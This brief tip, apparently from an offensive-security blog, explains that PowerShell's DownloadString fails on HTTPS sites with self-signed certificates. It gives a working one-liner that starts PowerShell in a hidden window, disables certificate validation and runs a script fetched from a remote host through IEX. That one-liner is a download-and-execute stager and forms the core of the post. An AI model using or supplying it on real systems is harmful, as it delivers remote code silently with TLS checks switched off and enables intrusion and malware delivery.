One bit of info that seems to fade into the background is when using "Webclient.DownloadString" on a HTTPS site that is 
using a self-signed certificate.

This will fail to complete successfully.

Meaning if your cert has not been signed by a CA / purchased and you try to perform a PowerShell webclient download string 
on a script from that domain via https, it will fail. In order to get this working again you have to add additional code 
to ignore cert checking.

Example IEX download string one-liner:

[  cmd /c powershell.exe -w hidden -c "&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};
   iex(New-Object System.Net.Webclient).DownloadString('https://192.168.0.15/your-script')}"  ]
